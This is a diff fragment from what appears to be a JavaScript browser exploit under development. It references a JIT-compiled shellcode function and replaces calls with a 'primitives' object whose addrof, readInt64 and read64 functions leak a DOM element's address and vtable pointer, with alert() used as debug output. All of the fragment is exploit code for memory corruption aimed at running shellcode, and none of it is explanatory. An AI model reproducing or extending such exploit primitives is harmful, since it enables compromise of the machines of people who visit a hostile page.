@@ -980,11 +980,11 @@ var shellcodeFunc = makeJITCompiledFunction();
     //primitives.write64(,0xdeadbeef0)
     //let stage1 = primitives;
         var wrapper = document.createElement("div")
-        var wrapper_addr = stage1.addrof(wrapper);
+        var wrapper_addr = primitives.addrof(wrapper);
 
-        var el_addr = memory.readInt64(wrapper_addr + 0x18)
-        var vtab = memory.readInt64(el_addr);
-    alert('vtabint64'+vtab + 'vtab64' + stage1.read64(el_addr));
+        var el_addr = primitives.readInt64(wrapper_addr + 0x18)
+        var vtab = primitives.readInt64(el_addr);
+    alert('vtabint64'+vtab + 'vtab64' + primitives.read64(el_addr));
     
 }
 function init() {
